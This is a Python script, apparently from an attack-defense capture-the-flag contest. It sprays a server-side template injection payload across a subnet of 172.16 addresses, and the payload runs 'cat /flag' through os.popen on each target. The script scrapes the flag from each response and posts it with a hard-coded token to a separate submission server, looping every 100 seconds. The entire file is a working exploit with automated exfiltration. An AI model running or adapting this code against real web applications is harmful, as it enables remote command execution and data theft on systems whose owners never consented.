import requests
import re
import time

submit_flag_url = 'http://10.10.10.10:9000/submit_flag/'
token = 'dxUrnS8uMQ9Yb2dNvZ372595jQZZEnmxZrtBarnw2zu7UAeMses2929YMrDdBy4w5n97jYuKaRE'


def attack_1():
    url_template = 'http://172.16.{}.{}:1337/lskdfjjklfhgjklkjwqrnqejkdla'
    data = '_xsrf=2%7C51eb82c5%7C065069530c5a03ffae33de0fc97799aa%7C1532488061&name=%7B%7B+__import__%28%22os%22%29.popen%28%22cat+%2Fflag%22%29.read%28%29+%7D%7D'

    for num in range(10, 19):
        for i in range(1, 25):
            print(f'{i}.{num}')
            url = url_template.format(i, num)
            try:
                r = requests.post(url, data=data, timeout=2)
                if r.status_code == 200:
                    flag = re.search('<li role="presentation"><a href="/shop">(.{60})', r.text).group(1)
                    print(requests.post(submit_flag_url, data={'flag': flag, 'token': token}).text)
                else:
                    print('not 200')
            except Exception as e:
                print(e)
                pass


while True:
    attack_1()
    time.sleep(100)
